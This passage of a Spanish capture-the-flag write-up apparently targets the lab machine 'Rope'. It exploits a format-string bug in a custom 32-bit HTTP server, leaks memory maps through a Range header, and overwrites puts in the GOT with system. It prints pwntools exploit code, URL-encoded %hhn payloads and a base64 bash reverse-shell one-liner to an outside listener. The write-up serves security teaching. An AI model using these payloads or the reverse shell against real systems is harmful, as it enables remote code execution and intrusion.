(iVar1 +4))) { local_138 =*(char**) (iVar1 +4); iVar2 =chdir(*(char**) (iVar1 +4)); if(iVar2 !=0) { perror(*(char**) (iVar1 +4)); /* WARNING: Subroutine does not return */ exit(1); } } else{ local_13c =atoi(*(char**) (iVar1 +4)); } } elseif(iVar2 ==3) { local_13c =atoi(*(char**) (iVar1 +8)); local_138 =*(char**) (iVar1 +4); iVar2 =chdir(*(char**) (iVar1 +4)); if(iVar2 !=0) { perror(*(char**) (iVar1 +4)); /* WARNING: Subroutine does not return */ exit(1); } } local_134 =open_listenfd(local_13c); local_130 =local_134; if(0\u0026lt;local_134) { printf(\"listen on port %d, fd is %d\\n\", local_13c, local_134); signal(0xd, (__sighandler_t) 0x1); signal(0x11, (__sighandler_t) 0x1); while(true) { do{ local_12c =accept(local_134, \u0026amp;local_124, \u0026amp;local_140); } while(local_12c \u0026lt;0); local_128 =process(local_12c, \u0026amp;local_124); if(local_128 ==1) break; close(local_12c); } /* WARNING: Subroutine does not return */ exit(0); } perror(\"ERROR\"); /* WARNING: Subroutine does not return */ exit(local_134); }  Básicamente, inicia un servidor de sockets en el puerto 9999 y espera por conexiones. En cuanto llega una conexión, se pasa a la función process:\nundefined4 process(intparam_1, undefined4 param_2) { __pid_t_Var1; undefined4 uVar2; int__fd; intin_GS_OFFSET; undefined4 local_884; stat local_870; charlocal_818[2048]; intlocal_18; intlocal_14; intlocal_10; local_10 =*(int*) (in_GS_OFFSET +0x14); _Var1 =fork(); if(_Var1 ==0) { if(param_1 \u0026lt;0) { uVar2 =1; } else{ _Var1 =getpid(); printf(\"accept request, fd is %d, pid is %d\\n\", param_1, _Var1); parse_request(param_1, local_818); local_884 =200; __fd =open(local_818, 0, 0); if(__fd \u0026lt;1) { local_884 =0x194; client_error(param_1, 0x194, \"Not found\", \"File not found\"); } else{ fstat(__fd, \u0026amp;local_870); if((local_870.st_mode \u0026amp;0xf000) ==0x8000) { if(local_14 ==0) { local_14 =local_870.st_size; } if(0\u0026lt;local_18) { local_884 =0xce; } serve_static(param_1, __fd, local_818, local_870.st_size); } elseif((local_870.st_mode \u0026amp;0xf000) ==0x4000) { local_884 =200; handle_directory_request(param_1, __fd, local_818); } else{ local_884 =400; client_error(param_1, 400, \"Error\", \"Unknow Error\"); } close(__fd); } log_access(local_884, param_2, local_818); uVar2 =1; } } else{ uVar2 =0; } if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { uVar2 =__stack_chk_fail_local(); } returnuVar2; }  Aquí podemos ver algunas funciones interesantes: parse_request, client_error, serve_static, handle_directory_request y log_access. Vamos a mirar esta última:\nvoidlog_access(undefined4 param_1, intparam_2, char*param_3) { intiVar1; uint16_tuVar2; char*pcVar3; intin_GS_OFFSET;  iVar1 =*(int*) (in_GS_OFFSET +0x14); uVar2 =ntohs(*(uint16_t*) (param_2 +2)); pcVar3 =inet_ntoa((in_addr) ((in_addr *) (param_2 +4))-\u0026gt;s_addr); printf(\"%s:%d%d- \", pcVar3, (uint) uVar2,param_1); printf(param_3); puts(\"\"); puts(\"request method:\"); puts(param_3 +0x400); if(iVar1 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  ¿Puedes verla? Digo, la vulnerabilidad. Esta función tiene una vulnerabilidad de Format String, ya que param_3 se pasa como primer argumento a printf. Esta variable param_3 es la variable local_818 de la función process, la cual contiene la URI pedida al servidor. Por tanto, podemos controlar esta variable y explotar la vulnerabilidad.\nPreparación del exploit Para ello, vamos a ejecutar httpserver en local. Sería bueno descargar la librería Glibc y el loader de la máquina remota, pero el servidor no muestra el cuerpo de respuesta al solicitar /proc/self/maps:\n$ curl 10.10.10.148:9999//proc/self/maps -vso - * Trying 10.10.10.148:9999... * Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0) \u0026gt; GET //proc/self/maps HTTP/1.1 \u0026gt; Host: 10.10.10.148:9999 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: no-cache \u0026lt; Content-length: 0 \u0026lt; Content-type: text/plain \u0026lt; * Connection #0 to host 10.10.10.148 left intact  Vamos a mirar la función parse_request:\nvoidparse_request(undefined4 param_1, intparam_2) { size_tsVar1; intin_GS_OFFSET; char*local_1028; intlocal_1024; undefined local_101c[1036]; charlocal_c10; charlocal_c0f; charlocal_c0e; charlocal_810[1024]; charlocal_410; characStack1039[1023]; intlocal_10;  local_10 =*(int*) (in_GS_OFFSET +0x14); *(undefined4 *) (param_2 +0x800) =0; *(undefined4 *) (param_2 +0x804) =0; rio_readinitb(local_101c, param_1); rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); __isoc99_sscanf(\u0026amp;local_c10, \"%s%s\", local_810, \u0026amp;local_410); while((local_c10 !='\\n'\u0026amp;\u0026amp;(local_c0f !='\\n'))) { rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); if((local_c10 =='R') \u0026amp;\u0026amp;((local_c0f =='a'\u0026amp;\u0026amp;(local_c0e =='n')))) { __isoc99_sscanf(\u0026amp;local_c10, \"Range: bytes=%lu-%lu\", param_2 +0x800, param_2 +0x804); if(*(int*) (param_2 +0x804) !=0) { *(int*) (param_2 +0x804) =*(int*) (param_2 +0x804) +1; } } } local_1028 =\u0026amp;local_410; if(local_410 =='/') { local_1028 =acStack1039; sVar1 =strlen(local_1028); if(sVar1 ==0) { local_1028 =\"./index.html\"; } else{ for(local_1024 =0; local_1024 \u0026lt;(int) sVar1; local_1024 =local_1024 +1) { if(local_1028[local_1024] =='?') { local_1028[local_1024] ='\\0'; break; } } } } strcpy((char*) (param_2 +0x400), local_810); url_decode(local_1028, param_2, 0x400); if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  Hay un punto en el que el programa mira si está la cabecera Range. Esta cabecera se puede usar para indicar al servidor la cantidad de bytes que queremos recibir. Vamos a probar:\n$ curl 10.10.10.148:9999//proc/self/maps -H 'Range: bytes=0-1000000' 565ab000-565ac000 r--p 00000000 08:02 46784 /opt/www/httpserver 565ac000-565ae000 r-xp 00001000 08:02 46784 /opt/www/httpserver 565ae000-565af000 r--p 00003000 08:02 46784 /opt/www/httpserver 565af000-565b0000 r--p 00003000 08:02 46784 /opt/www/httpserver 565b0000-565b1000 rw-p 00004000 08:02 46784 /opt/www/httpserver 57c42000-57c64000 rw-p 00000000 00:00 0 [heap] f7dad000-f7f7f000 r-xp 00000000 08:02 46904 /lib32/libc-2.27.so f7f7f000-f7f80000 ---p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f80000-f7f82000 r--p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f82000-f7f83000 rw-p 001d4000 08:02 46904 /lib32/libc-2.27.so f7f83000-f7f86000 rw-p 00000000 00:00 0 f7f8f000-f7f91000 rw-p 00000000 00:00 0 f7f91000-f7f94000 r--p 00000000 00:00 0 [vvar] f7f94000-f7f96000 r-xp 00000000 00:00 0 [vdso] f7f96000-f7fbc000 r-xp 00000000 08:02 46900 /lib32/ld-2.27.so f7fbc000-f7fbd000 r--p 00025000 08:02 46900 /lib32/ld-2.27.so f7fbd000-f7fbe000 rw-p 00026000 08:02 46900 /lib32/ld-2.27.so ffea8000-ffec9000 rw-p 00000000 00:00 0 [stack] curl: (18) transfer closed with 998488 bytes remaining to read  Genial, hemos podido obtener el archivo correctamente. Además, podemos aplicar la misma cabecera para leer /proc/self/cmdline y /proc/self/environ:\n$ curl 10.10.10.148:9999//proc/self/cmdline -H 'Range: bytes=0-1000000' -so - ./httpserver $ curl 10.10.10.148:9999//proc/self/environ -H 'Range: bytes=0-1000000' -so - | tr '\\0' '\\n' LANG=en_US.UTF-8 SUDO_GID=0 USERNAME=john SUDO_COMMAND=/opt/www/run.sh USER=john PWD=/opt/www HOME=/root SUDO_USER=root SUDO_UID=0 MAIL=/var/mail/john TERM=unknown SHELL=/bin/bash SHLVL=1 LOGNAME=john PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin OLDPWD=/root _=./httpserver  El archivo /proc/self/maps será útil para la explotación de Format String, ya que tenemos la dirección base del binario y de Glibc. De hecho, el binario está protegido con NX, PIE y el canario:\n$ checksec httpserver [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  Por tanto, para calcular una dirección de una función en tiempo de ejecución, tenemos que usar una dirección base y el correspondiente offset (ya sea del binario o de Glibc), ya que ASLR está habilitado en la máquina (aparece un 2 en /proc/sys/kernel/randomize_va_space):\n$ curl 10.10.10.148:9999//proc/sys/kernel/randomize_va_space -H 'Range: bytes=0-1000000' -so - 2  Explotación de Format String Vamos a ejecutar el binario en local:\n$ ./httpserver listen on port 9999, fd is 3  Ahora podemos ver la vulnerabilidad de Format String (nótese que %x tiene que ser codificado en URL como %25x):\n$ curl 127.0.0.1:9999 File not found $ curl 127.0.0.1:9999/%25x.%25x.%25x.%25x File not found  El payload funciona, ya que vemos algunos valores en hexadecimal (%x es una format string que muestra un valor como número hexadecimal), que son datos de la pila (stack):\n$ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 67081 127.0.0.1:34232 404 - ./index.html request method: GET accept request, fd is 4, pid is 67139 127.0.0.1:34236 404 - f7f8f0dc.85bc.194.ffca3898 request method: GET  Para poder explotar una vulnerabilidad de Format String como esta, tenemos que obtener la posición en la pila donde se almacena nuestro payload (sí, el payload que le pasamos al binario se almacena en el stack también):\n$ curl 127.0.0.1:9999/$(python3 -c 'print(\"%25x.\" * 100)') File not found  $ ./httpserver listen on port 9999, fd is 3 ... accept request, fd is 4, pid is 78524 127.0.0.1:34254 404 - f7f8f0dc.85ce.194.ffca3898.ffca3084.ffca38dc.194.ffca3898.f7facad4.2e.91acc300.56659000.f7f74000.ffca3898.566566e3.194.ffca38dc.ffca3084.56657401.ffca3054.ffca3050.ffca38dc.4.f7fc2000.f7f965d0.194.0.ffffffff.56657401.ffca3050.42dedaf.ffca30e4.f7f8e3e0.f7f8e760.1.0.1.f7f76098.f7f74000.5712f008.f7e85ea0.5712f000.f7e85f58.57130000.85bdb5ef.f7f8e2d0.ffca30e4.f7d9bd81.f7fa16bd.f7d901fc.f7f74740.1000.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e. request method: GET  Si contamos los puntos, veremos que nuestro payload aparece en la posición 53. Podemos comprobarlo mediante %53$x (codificado como %2553%24x):\n$ curl 127.0.0.1:9999/%2553%24x File not found $ curl 127.0.0.1:9999/ABCD%2553%24x File not found  $ ./httpserver listen on port 9999, fd is 3 ... accept request, fd is 4, pid is 82102 127.0.0.1:34264 404 - 24333525 request method: GET accept request, fd is 4, pid is 82381 127.0.0.1:34268 404 - ABCD44434241 request method: GET  Como se puede observar, si enviamos %53$x, recibimos 24333525, que es %53$x en formato hexadecimal (little-endian). Y si añadimos ABCD al principio, vemos ABCD más 44434241 (que es ABCD en formato hexadecimal, little-endian).\nLas vulnerabilidades de Format String no solamente permiten leer valores arbitrarios de la pila, también permiten escribir datos arbitrarios usando %n. La manera en la que %n funciona es que escribe el número de bytes impresos hasta la format string (%n) en la dirección que está referenciada. Por ejemplo, introducir 1234%5$n en printf significa escribir 4 en la dirección que aparece en la quinta posición de la pila.\nComo tenemos control sobre la pila a partir de la posición 53, podemos añadir una dirección arbitraria ahí y escribir datos arbitrarios en dicha dirección usando %53$n. Además, si tuviéramos que imprimir una gran cantidad de bytes, podríamos abusar de otra format string, que es %c. Al usar %1234c imprimiremos 1234 espacios en blanco (en lugar de enviar dicha cantidad de caracteres).\nEntonces, ¿cuál es la estrategia de explotación? Como el binario tiene Partial RELRO, entonces podemos modificar la Tabla de Offsets Globales (Global Offset Table, GOT). Esta tabla contiene las direcciones de las funciones externas en tiempo de ejecución (si han sido llamadas al menos una vez, si no, apuntan a otra dirección para realizar la resolución de direcciones).\nLa idea es modificar la dirección de una función de Glibc para que apunte a system. Las mejores funciones para esto son las que reciben una string como primer argumento (por ejemplo, printf, strlen o puts), la que luego podemos introducir directamente una string con un comando de sistema que será ejecutado por system.\nVamos a usar GDB para depurar un poco. Como se trata de un servidor que usa fork, tenemos que poner las siguientes configuraciones:\n$ gdb -q httpserver Reading symbols from httpserver... (No debugging symbols found in httpserver) gef➤ set follow-fork-mode child gef➤ set detach-on-fork off gef➤ run Starting program: ./httpserver listen on port 9999, fd is 3 ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ got GOT protection: Partial RelRO | GOT functions: 43 [0x5655a00c] setsockopt@GLIBC_2.0 → 0xf7ecb570 [0x5655a010] strcmp@GLIBC_2.0 → 0x56556046 [0x5655a014] read@GLIBC_2.0 → 0x56556056 [0x5655a018] printf@GLIBC_2.0 → 0xf7e16d30 [0x5655a01c] memcpy@GLIBC_2.0 → 0x56556076 [0x5655a020] inet_ntoa@GLIBC_2.0 → 0x56556086 ... [0x5655a040] strcpy@GLIBC_2.0 → 0x56556106 [0x5655a044] getpid@GLIBC_2.0 → 0x56556116 [0x5655a048] puts@GLIBC_2.0 → 0x56556126 [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 ... [0x5655a068] getcwd@GLIBC_2.0 → 0xf7eb83a0 [0x5655a06c] strlen@GLIBC_2.0 → 0x565561b6 [0x5655a070] __libc_start_main@GLIBC_2.0 → 0xf7de1de0 [0x5655a074] write@GLIBC_2.0 → 0x565561d6 [0x5655a078] bind@GLIBC_2.0 → 0xf7ecaf30 [0x5655a07c] __isoc99_sscanf@GLIBC_2.7 → 0x565561f6 ... [0x5655a0a8] atoi@GLIBC_2.0 → 0x565562a6 [0x5655a0ac] socket@GLIBC_2.0 → 0xf7ecb660 [0x5655a0b0] close@GLIBC_2.0 → 0x565562c6 [0x5655a0b4] closedir@GLIBC_2.0 → 0x565562d6 gef➤ p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ continue Continuing.  Como se puede ver, la entrada de puts aparece en la dirección 0x5655a048 (aún no apunta a una dirección real porque no ha sido llamada aún), y system está en 0xf7e08360. Vamos a comenzar por sobrescribir la dirección entera de puts por 0xff (255). Para ello, podemos usar este payload: \u0026quot;%255c%56$n--\\x48\\xa0\\x55\\x56\u0026quot;. Nótese que en la pila, este payload se guarda en palabras de 4 bytes (32 bits):\n$ echo -ne '%255c%56$n--\\x48\\xa0\\x55\\x56' | xxd -c 4 -g 4 00000000: 25323535 %255 00000004: 63253536 c%56 00000008: 246e2d2d $n-- 0000000c: 48a05556 H.UV  Nótese también que -- es solo para rellenar el payload y que las direcciones queden ajustadas a una posición del stack (particularmente, la posición 56). Antes de verificarlo, vamos a poner un breakpoint antes de la llamada vulnerable a printf:\n^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ disassemble log_access Dump of assembler code for function log_access: 0x56557077 \u0026lt;+0\u0026gt;: push ebp 0x56557078 \u0026lt;+1\u0026gt;: mov ebp,esp 0x5655707a \u0026lt;+3\u0026gt;: push esi 0x5655707b \u0026lt;+4\u0026gt;: push ebx 0x5655707c \u0026lt;+5\u0026gt;: sub esp,0x20 ... 0x565570e5 \u0026lt;+110\u0026gt;: mov eax,DWORD PTR [ebp-0x24] 0x565570e8 \u0026lt;+113\u0026gt;: sub esp,0xc 0x565570eb \u0026lt;+116\u0026gt;: push eax 0x565570ec \u0026lt;+117\u0026gt;: call 0x56556060 \u0026lt;printf@plt\u0026gt; 0x565570f1 \u0026lt;+122\u0026gt;: add esp,0x10 0x565570f4 \u0026lt;+125\u0026gt;: sub esp,0xc 0x565570f7 \u0026lt;+128\u0026gt;: lea eax,[ebx-0x1e1e] 0x565570fd \u0026lt;+134\u0026gt;: push eax 0x565570fe \u0026lt;+135\u0026gt;: call 0x56556120 \u0026lt;puts@plt\u0026gt; 0x56557103 \u0026lt;+140\u0026gt;: add esp,0x10 0x56557106 \u0026lt;+143\u0026gt;: sub esp,0xc 0x56557109 \u0026lt;+146\u0026gt;: lea eax,[ebx-0x1d50] 0x5655710f \u0026lt;+152\u0026gt;: push eax 0x56557110 \u0026lt;+153\u0026gt;: call 0x56556120 \u0026lt;puts@plt\u0026gt; ... End of assembler dump. gef➤ break *log_access+122 Breakpoint 1 at 0x565570f1 gef➤ continue Continuing.  También tenemos que codificar los datos:\n$ curl 127.0.0.1:9999/%25255c%2556%24n--%48%a0%55%56 File not found  En este punto, la entrada de puts en la GOT ahora debería valer 0xff:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 43 ... [0x5655a048] puts@GLIBC_2.0 → 0xff [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 [0x5655a050] sendfile@GLIBC_2.1 → 0x56556146 [0x5655a054] exit@GLIBC_2.0 → 0x56556156 [0x5655a058] open@GLIBC_2.0 → 0xf7eb7120 ... gef➤ continue Continuing.  Y ahí está. Sin embargo, tenemos que introducir un valor mucho más grande para poder poner la dirección de system. Para conseguir esto, podemos usar %hhn para escribir un solo byte.\nVamos a hacerlo a mano: la dirección de system está en 0xf7e08360, por lo que el primer byte lo sobrescribimos con 0x60 (96 en decimal), el segundo con 0x83 (131), el tercero con 0xe0 (224 en decimal), y el último con 0xf7 (247 en decimal).\nManualmente, la primera sobrescritura tiene que ser con el payload \u0026quot;%96c%56$hhn-\\x48\\xa0\\x55\\x56\u0026quot;. Ahora para el segundo byte, el payload será \u0026quot;%30c%60$hhn-\\x49\\xa0\\x55\\x56\u0026quot; (nótese que 30 = 131 - 96 - 4 - 1, porque ya hemos impreso 96 caracteres, más la dirección de 4 bytes más el relleno -; y también que estamos escribiendo en 0x5655a048 + 1 = 0x5655a049). El tercer byte será sobrescrito con el payload \u0026quot;%88c%64$hhn-\\x4a\\xa0\\x55\\x56\u0026quot;. Y el último byte, con \u0026quot;%18c%68$hhn-\\x4b\\xa0\\x55\\x56\u0026quot;. Por tanto, tenemos este payload completo:\n%96c%56$hhn-\\x48\\xa0\\x55\\x56%30c%60$hhn-\\x49\\xa0\\x55\\x56%88c%64$hhn-\\x4a\\xa0\\x55\\x56%18c%68$hhn-\\x4b\\xa0\\x55\\x56  Vamos a probarlo (usando codificación URL):\n$ curl 127.0.0.1:9999/%2596c%2556%24hhn-%48%a0%55%56%2530c%2560%24hhn-%49%a0%55%56%2588c%2564%24hhn-%4a%a0%55%56%2519c%2568%24hhn-%4b%a0%55%56 File not found  [Attaching after process 192000 fork to child process 192115] [New inferior 2 (process 192115)] accept request, fd is 4, pid is 192115 [Switching to process 192115] Thread 2.1 \"httpserver\" hit Breakpoint 1, 0x565570f1 in log_access ()  gef➤ p system $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ got GOT protection: Partial RelRO | GOT functions: 43 ... [0x5655a048] puts@GLIBC_2.0 → 0xf7e08360 [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 [0x5655a050] sendfile@GLIBC_2.1 → 0x56556146 [0x5655a054] exit@GLIBC_2.0 → 0x56556156 [0x5655a058] open@GLIBC_2.0 → 0xf7eb7120 ... gef➤ continue Continuing. [Attaching after process 203855 vfork to child process 206427] [New inferior 3 (process 206427)] process 206427 is executing new program: /usr/bin/dash Error in re-setting breakpoint 1: No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. [Inferior 3 (process 206427) exited normally]  ¡Ahí está! Ahora puts es system. Recordemos la siguiente porción de código de la función log_access:\nvoidlog_access(undefined4 param_1, intparam_2, char*param_3) { // ... printf(\"%s:%d%d- \", pcVar3, (uint) uVar2,param_1); printf(param_3); puts(\"\"); puts(\"request method:\"); puts(param_3 +0x400); // ... return; }  Entonces, si puts es system, podemos ejecutar lo que queramos siempre que nuestro comando esté en param_3 + 0x400. Por el momento, vamos a comenzar a escribir el exploit en Python:\n#!/usr/bin/env python3 frompwnimport* context.binary='httpserver' defurl_encode(url: bytes) -\u0026gt; bytes: returnb'%'+'%'.join(hex(byte)[2:] forbyteinurl).encode() defmain(): fmtstr=b'%96c%56$hhn-\\x48\\xa0\\x55\\x56%30c%60$hhn-\\x49\\xa0\\x55\\x56%88c%64$hhn-\\x4a\\xa0\\x55\\x56%18c%68$hhn-\\x4b\\xa0\\x55\\x56' payload=url_encode(fmtstr) http=remote('127.0.0.1', 9999) http.sendline(b'GET /'+payload+b' HTTP/1.1\\n') http.close() if__name__=='__main__': main()  He deshabilitado ASLR para realizar pruebas. Una vez que el binario está en ejecución (fuera de GDB), podemos lanzar el exploit:\n$ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  Como esperábamos, aparecen algúnos errores de sh (comandos no encontrados):\n$ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 261035 sh: 1: request: not found Usage: GET [-options] \u0026lt;url\u0026gt;... -m \u0026lt;method\u0026gt; use method for the request (default is 'GET') -f make request even if GET believes method is illegal -b \u0026lt;base\u0026gt; Use the specified URL as base -t \u0026lt;timeout\u0026gt; Set timeout value -i \u0026lt;time\u0026gt; Set the If-Modified-Since header on the request -c \u0026lt;conttype\u0026gt; use this content-type for POST, PUT, CHECKIN -a Use text mode for content I/O -p \u0026lt;proxyurl\u0026gt; use this as a proxy -P don't load proxy settings from environment -H \u0026lt;header\u0026gt; send this HTTP header (you can specify several) -C \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; provide credentials for basic authentication -u Display method and URL before any response -U Display request headers (implies -u) -s Display response status code -S Display response status chain (implies -u) -e Display response headers (implies -s) -E Display whole chain of headers (implies -S and -U) -d Do not display content -o \u0026lt;format\u0026gt; Process HTML content in various ways -v Show program version -h Print this message 127.0.0.1:34438 404 - -HUV -IUV -JUV X-KUV  Pero hay uno interesante. De hecho, GET es un comando, y su panel de ayuda se muestra cuando se ejecuta sin argumentos:\n$ GET Usage: GET [-options] \u0026lt;url\u0026gt;... -m \u0026lt;method\u0026gt; use method for the request (default is 'GET') -f make request even if GET believes method is illegal -b \u0026lt;base\u0026gt; Use the specified URL as base -t \u0026lt;timeout\u0026gt; Set timeout value -i \u0026lt;time\u0026gt; Set the If-Modified-Since header on the request -c \u0026lt;conttype\u0026gt; use this content-type for POST, PUT, CHECKIN -a Use text mode for content I/O -p \u0026lt;proxyurl\u0026gt; use this as a proxy -P don't load proxy settings from environment -H \u0026lt;header\u0026gt; send this HTTP header (you can specify several) -C \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; provide credentials for basic authentication -u Display method and URL before any response -U Display request headers (implies -u) -s Display response status code -S Display response status chain (implies -u) -e Display response headers (implies -s) -E Display whole chain of headers (implies -S and -U) -d Do not display content -o \u0026lt;format\u0026gt; Process HTML content in various ways -v Show program version -h Print this message  Obteniento RCE Si modificamos el exploit cambiando GET por whoami, veremos la ejecución de whoami:\n$ sed -i s/GET/whoami/g fmtstr_exploit.py $ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  $ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 263141 sh: 1: request: not found rocky 127.0.0.1:34440 404 - -HUV -IUV -JUV X-KUV  Chulo, ¿no? Entonces param_3 + 0x400 apunta exactamente al método de petición HTTP. Podemos verificarlo en el código fuente descompilado:\nvoidparse_request(undefined4 param_1, intparam_2) { // ... local_10 =*(int*) (in_GS_OFFSET +0x14); *(undefined4 *) (param_2 +0x800) =0; *(undefined4 *) (param_2 +0x804) =0; rio_readinitb(local_101c, param_1); rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); __isoc99_sscanf(\u0026amp;local_c10, \"%s%s\", local_810, \u0026amp;local_410); // ... strcpy((char*) (param_2 +0x400), local_810); url_decode(local_1028, param_2, 0x400); if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  Aquí aparece sscanf (__isoc99_sscanf) para parsear la línea de petición, dividiéndola por espacios en blanco, de manera que la primera parte (el método HTTP) va a local_810. Y luego, se copia en param_2 + 0x400. Esta variable param_2 en parse_request es la misma que param_3 en log_access.\nEntonces tenemos una manera de ejecutar comandos explotando la vulnerabilidad de Format String. Pero hay otro problema: no podemos usar espacios en el comando. De acuerdo con unix.stackexchange.com, es posible usar la variable de entorno ${IFS} para eso. Vamos a probar:\n$ sed -i s/whoami/echo\\${IFS}asdf/g fmtstr_exploit.py $ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  $ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 335175 sh: 1: request: not found asdf 127.0.0.1:34442 404 - -HUV -IUV -JUV X-KUV  Genial, ya va siendo hora de explotar el servidor remoto. Recordemos que teníamos información útil en /proc/self/maps (la dirección base del binario es 0x565ab000 y la dirección base de Glibc es 0xf7dad000):\n$ curl 10.10.10.148:9999//proc/self/maps -H 'Range: bytes=0-1000000' 565ab000-565ac000 r--p 00000000 08:02 46784 /opt/www/httpserver 565ac000-565ae000 r-xp 00001000 08:02 46784 /opt/www/httpserver 565ae000-565af000 r--p 00003000 08:02 46784 /opt/www/httpserver 565af000-565b0000 r--p 00003000 08:02 46784 /opt/www/httpserver 565b0000-565b1000 rw-p 00004000 08:02 46784 /opt/www/httpserver 57c42000-57c64000 rw-p 00000000 00:00 0 [heap] f7dad000-f7f7f000 r-xp 00000000 08:02 46904 /lib32/libc-2.27.so f7f7f000-f7f80000 ---p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f80000-f7f82000 r--p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f82000-f7f83000 rw-p 001d4000 08:02 46904 /lib32/libc-2.27.so f7f83000-f7f86000 rw-p 00000000 00:00 0 f7f8f000-f7f91000 rw-p 00000000 00:00 0 f7f91000-f7f94000 r--p 00000000 00:00 0 [vvar] f7f94000-f7f96000 r-xp 00000000 00:00 0 [vdso] f7f96000-f7fbc000 r-xp 00000000 08:02 46900 /lib32/ld-2.27.so f7fbc000-f7fbd000 r--p 00025000 08:02 46900 /lib32/ld-2.27.so f7fbd000-f7fbe000 rw-p 00026000 08:02 46900 /lib32/ld-2.27.so ffea8000-ffec9000 rw-p 00000000 00:00 0 [stack] curl: (18) transfer closed with 998488 bytes remaining to read  Vamos a descargar la librería Glibc remota:\n$ wget -q 10.10.10.148:9999//lib32/libc-2.27.so $ file libc-2.27.so libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=63b3d43ad45e1b0f601848c65b067f9e9b40528b, for GNU/Linux 3.2.0, stripped  Una vez que hemos entendido cómo funciona un exploit de Format String, podemos automatizar todo con pwntools. Veremos que es extremadamente fácil:\ndefmain(): iflen(sys.argv) ==1: log.error(f\"Usage: python3 {sys.argv[0]}'\u0026lt;command\u0026gt;'\") elf.address, glibc.address=get_base_addresses() log.success(f'ELF base address : {hex(elf.address)}') log.success(f'Glibc base address: {hex(glibc.address)}') command=sys.argv[1].replace(' ', '${IFS}').encode() payload=url_encode(fmtstr_payload(53, { elf.got.puts: glibc.sym.system })) http=remote(host, 9999) http.sendline(command+b' /'+payload+b' HTTP/1.1\\n') http.close()  El exploit completo se puede encontrar aquí: fmtstr_exploit.py.\nAhora podemos conseguir una reverse shell en la máquina usando nc:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ python3 fmtstr_exploit.py 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 10.10.10.148 on port 9999: Done [*] Closed connection to 10.10.10.148 port 9999 [+] ELF base address : 0x5657c000 [+] Glibc base address: 0xf7d7a000 [+] Opening connection to 10.10.10.148 on port 9999: Done [*] Closed connection to 10.10.10.148 port 9999  $ nc -nlvp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.10.148 43178 bash: cannot set terminal process group (1193): Inappropriate ioctl for device bash: no job control in this shell bash: /root/.bashrc: Permission denied john@rope:/opt/www$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null bash: /root/.bashrc: Permission denied john@rope:/opt/www$ ^Z zsh: suspended nc -nlvp 4444 $ stty raw -echo; fg [1] + continued nc -nlvp 4444 reset xterm john@rope:/opt/www$ export TERM=xterm 